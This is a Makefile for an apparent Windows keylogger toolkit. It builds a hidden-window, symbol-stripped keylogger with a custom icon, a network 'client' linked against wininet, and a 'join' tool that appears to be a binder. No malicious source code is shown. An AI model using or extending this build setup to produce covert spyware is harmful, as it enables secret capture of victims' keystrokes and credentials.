all: keylogger client join

keylogger:
	gcc keylogger.c icon.res -o keylogger -mwindows -s -Os -mms-bitfields -IC:/gtk3/include/gtk-3.0 -IC:/gtk3/include/cairo -IC:/gtk3/include/pango-1.0 -IC:/gtk3/include/atk-1.0 -IC:/gtk3/include/cairo -IC:/gtk3/include/pixman-1 -IC:/gtk3/include -IC:/gtk3/include/freetype2 -IC:/gtk3/include -IC:/gtk3/include/libpng15 -IC:/gtk3/include/gdk-pixbuf-2.0 -IC:/gtk3/include/libpng15 -IC:/gtk3/include/glib-2.0 -IC:/gtk3/lib/glib-2.0/include -LC:/gtk3/lib -lgtk-3 -lgdk-3 -lgdi32 -limm32 -lshell32 -lole32 -Wl,-luuid -lpangocairo-1.0 -lpangoft2-1.0 -lfreetype -lfontconfig -lpangowin32-1.0 -lgdi32 -lpango-1.0 -lm -latk-1.0 -lcairo-gobject -lcairo -lgdk_pixbuf-2.0 -lgio-2.0 -lgobject-2.0 -lglib-2.0 "-Wl,--export-all-symbols"

client:
	gcc client.c functions.c -o client -mwindows -s -Os -liphlpapi -lwininet

join:
	gcc join.c -o join
	
icon:
	windres icon.rc -O coff -o icon.res

clean:
	del join.exe client.exe keylogger.exe
